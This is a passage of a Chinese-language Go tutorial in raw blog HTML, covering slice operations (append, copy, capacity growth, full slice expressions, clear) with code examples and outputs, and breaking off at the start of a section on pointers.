class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">100</span>, <span class="hljs-number">200</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>&#125;,<br>&#125;<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>]]<br></code></pre></td></tr></table></figure><p>还可以直接修改 struct array&#x2F;slice 成员</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>d := [<span class="hljs-number">5</span>]<span class="hljs-keyword">struct</span> &#123;<span class="hljs-comment">//创建一个数组，元素为结构体</span><br>x <span class="hljs-type">int</span><br>&#125;&#123;&#125;<br>s := d[:]<br>d[<span class="hljs-number">1</span>].x = <span class="hljs-number">10</span><span class="hljs-comment">//修改 d 中的第二个元素为 10</span><br>s[<span class="hljs-number">2</span>].x = <span class="hljs-number">20</span><span class="hljs-comment">//修改 s 中第三个元素为 20</span><br>fmt.Println(d)<br>fmt.Printf(<span class="hljs-string">&quot;%p,%p\n&quot;</span>, &amp;d, &amp;d[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[&#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">10</span>&#125; &#123;<span class="hljs-number">20</span>&#125; &#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">0</span>&#125;]<br><span class="hljs-number">0xc000010390</span>,<span class="hljs-number">0xc000010390</span><br></code></pre></td></tr></table></figure><p>数组  <code>d</code>  和切片  <code>s</code>  共享同一块底层数据，因此通过数组或切片修改数据会相互影响</p><h2 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(a)<br><span class="hljs-keyword">var</span> b = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br>fmt.Println(b)<br>c := <span class="hljs-built_in">append</span>(a, b...)<br>fmt.Println(c)<br>d := <span class="hljs-built_in">append</span>(c, <span class="hljs-number">7</span>)<br>fmt.Println(d)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>]<br></code></pre></td></tr></table></figure><p>append 向 slice 尾部添加数据，返回新的对象</p><p>超出原 slice.cap 的限制时，会重新分配底层数组，即使是原数组没有填满</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>: <span class="hljs-number">0</span>&#125; <span class="hljs-comment">//自动推导数组长度，数组扩展到长度 11</span><br>s := data[:<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]                        <span class="hljs-comment">//从 0 索引到 2 索引，容量为 3</span><br><br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br><br>fmt.Println(s, data)<br>fmt.Println(&amp;s[<span class="hljs-number">0</span>], &amp;data[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0xc000010390</span> <span class="hljs-number">0xc0000141e0</span><br></code></pre></td></tr></table></figure><p>append 后的 s 重新分配了底层数组</p><p>slice 中 cap 重新分配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>c := <span class="hljs-built_in">cap</span>(s)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++ &#123;<br>s = <span class="hljs-built_in">append</span>(s, i)<br><span class="hljs-keyword">if</span> n := <span class="hljs-built_in">cap</span>(s); n &gt; c &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d-&gt;%d\n&quot;</span>, c, n)<br>c = n<br>&#125;<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span><br><span class="hljs-number">2</span>-&gt;<span class="hljs-number">4</span><br><span class="hljs-number">4</span>-&gt;<span class="hljs-number">8</span><br><span class="hljs-number">8</span>-&gt;<span class="hljs-number">16</span><br><span class="hljs-number">16</span>-&gt;<span class="hljs-number">32</span><br><span class="hljs-number">32</span>-&gt;<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>通常以 <strong>2</strong> 倍容量来分配底层数组</p><h2 id="切片拷贝"><a href="#切片拷贝" class="headerlink" title="切片拷贝"></a>切片拷贝</h2><p>copy() 函数复制数据，以长度小的为准，长度小的复制到大的去，指向同一底层数组，允许元素区间重叠</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br>s3 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, s2...)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v&quot;</span>, s3)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>fmt.Println(data)<br><br>s1 := data[<span class="hljs-number">8</span>:]<span class="hljs-comment">//取 data[8] 到 data[9] </span><br>s2 := data[:<span class="hljs-number">5</span>]<span class="hljs-comment">//取 data[0] 到 data[4]</span><br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>s2 是 data 的引用，所以后面 s2 变化导致了 data 的变化</p><h2 id="slice-遍历"><a href="#slice-遍历" class="headerlink" title="slice 遍历"></a>slice 遍历</h2><p>跟其他遍历差不多</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br>slice := data[:]<br><span class="hljs-keyword">for</span> value := <span class="hljs-keyword">range</span> slice &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%v,&quot;</span>, value)<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<br></code></pre></td></tr></table></figure><h2 id="切片-resize"><a href="#切片-resize" class="headerlink" title="切片 resize"></a>切片 resize</h2><p>调整大小</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a))<br><br>b := a[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, b, <span class="hljs-built_in">len</span>(b))<br><br>c := b[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v&quot;</span>, c, <span class="hljs-built_in">len</span>(c))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>],<span class="hljs-number">5</span><br>[<span class="hljs-number">2</span>],<span class="hljs-number">1</span><br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>],<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="字符串和切片"><a href="#字符串和切片" class="headerlink" title="字符串和切片"></a>字符串和切片</h2><p>string 底层是一个 byte 的数组，所以也能进行切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>s1 := str[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>fmt.Println(s1)<br><br>s2 := str[<span class="hljs-number">6</span>:]<br>fmt.Println(s2)<br>&#125;<br>&gt;&gt;<br>butt3<br>f1y<br></code></pre></td></tr></table></figure><p>string 是不可变的，不能直接修改，可以将字符转化为字节切片，修改之后再转为字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>    s := []<span class="hljs-type">byte</span>(str) <span class="hljs-comment">//中文字符用 []rune(str)</span><br>s[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27;h&#x27;</span><br>s = s[:<span class="hljs-number">8</span>]<br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-string">&#x27;!&#x27;</span>)<br>str = <span class="hljs-type">string</span>(s)<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;<br>butt3rfh!<br></code></pre></td></tr></table></figure><h2 id="多维切片"><a href="#多维切片" class="headerlink" title="多维切片"></a>多维切片</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> nums [<span class="hljs-number">5</span>][<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;<br>fmt.Println(num)<br>&#125;<br>fmt.Println()<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> _, slice := <span class="hljs-keyword">range</span> slices &#123;<br>fmt.Println(slice)<br>&#125;<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>[]<br>[]<br>[]<br>[]<br>[]<br></code></pre></td></tr></table></figure><p>Go 的数组和切片都是一维的，要创建二维数组或切片需要定义一个数组的数组或切片的切片。从上面例子能看出来，数组初始化时一维和二维长度是固定了，而切片是不固定的，所以切片需要单独初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(slices); i++ &#123;<br>slices[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br>&#125;<br>fmt.Println(slices)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]]<br></code></pre></td></tr></table></figure><h2 id="拓展表达"><a href="#拓展表达" class="headerlink" title="拓展表达"></a>拓展表达</h2><p><strong>只有切片才能使用拓展表达</strong>，解决切片共享底层数组的读写问题</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">slice[low:high:max]</span><br><span class="hljs-section">low: 起始索引</span><br><span class="hljs-section">high: 结束索引(不包含)</span><br><span class="hljs-section">max: 最大容量</span><br></code></pre></td></tr></table></figure><p>像前面说的，s1 和 s2 共享的是一个底层数组，那么对 s2 进行改变时也会对 s1 有影响，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>]<br>s2 = <span class="hljs-built_in">append</span>(s2, <span class="hljs-number">1</span>)<br>fmt.Println(s2)<br>fmt.Println(s1)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">1</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>这个就会影响 s1 的数据，向 s2 添加元素，把 s1 更改了，这个时候用拓展表达式就能解决了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := s1[<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-number">4</span>]<br>&gt;&gt;<br>[<span class="hljs-number">7</span> <span class="hljs-number">1</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><p>clear() 会将切片内所有的值置为零值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>clear(s)<br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>清空切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>    s = s[:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>]<br>  fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[]<br></code></pre></td></tr></table></figure><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>Go 中是指针不能进行偏移和运算，有两个常用操作符：取地址符 <code>&amp;</code>，解引用符 <code>*</code></p><h2 id="指针地址"><a href="#指针地址" class="headerlink" title="指针地址"></a>指针地址</h2><p>&amp; 取地址，取变量指针</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">ptr := <span class="hljs-variable">&amp;v</span><span class="hljs-comment">//v 的类型为 T</span><br><span class="hljs-symbol">v:</span>被取地址的变量，类型为 T<br><span class="hljs-symbol">ptr:</span>接收地址的变量，ptr 的类型为 *T，为 T 的指针类型<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">10</span><br>b := &amp;a<br>fmt.Printf(<span class="hljs-string">&quot;a:%d ptr:%p\n&quot;</span>, a, 